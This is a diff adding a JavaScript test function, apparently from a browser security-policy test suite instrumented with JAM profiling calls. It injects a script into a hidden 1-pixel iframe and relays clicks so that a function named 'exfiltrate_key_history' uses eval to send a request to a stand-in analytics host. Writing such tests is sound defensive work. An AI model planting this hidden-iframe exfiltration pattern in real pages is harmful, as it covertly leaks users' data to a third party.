@@ -1,0 +1,10 @@
+function runTest() {
+
+  JAM.startProfile('load');
+  function click_inner(){var event=new Event("click");document.getElementById("test2").dispatchEvent(event)}var pol=document.head.childNodes[5],tx=document.head.childNodes[7],button=document.getElementById("test"),button2=button.cloneNode(!0);button2.id="test2";var script=document.createElement("script");JAM.set(script,"innerHTML","function exfiltrate_key_history() {var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open(\"GET\", \"http://AnalyticsInc:8000/submission.html?test=iframe\", true);xmlhttp.send(null);';eval(exp);}document.getElementById('test2').onclick = exfiltrate_key_history;");
+  var frm=document.createElement("iframe");JAM.call(frm.setAttribute,frm,["id","ifrm"]);JAM.call(frm.setAttribute,frm,["src","JavaScript:''"]);frm.style.width="1px";frm.style.height="1px";JAM.call(frm.appendChild,frm,[tx]);JAM.call(frm.appendChild,frm,[button2]);JAM.call(frm.appendChild,frm,[script]);var v5=document.body;JAM.call(v5.appendChild,v5,[frm]);JAM.set(document.getElementById("test"),"onclick",click_inner)
+
+  JAM.stopProfile('load');
+
+  return "RESULT NOT SPECIFIED";
+}
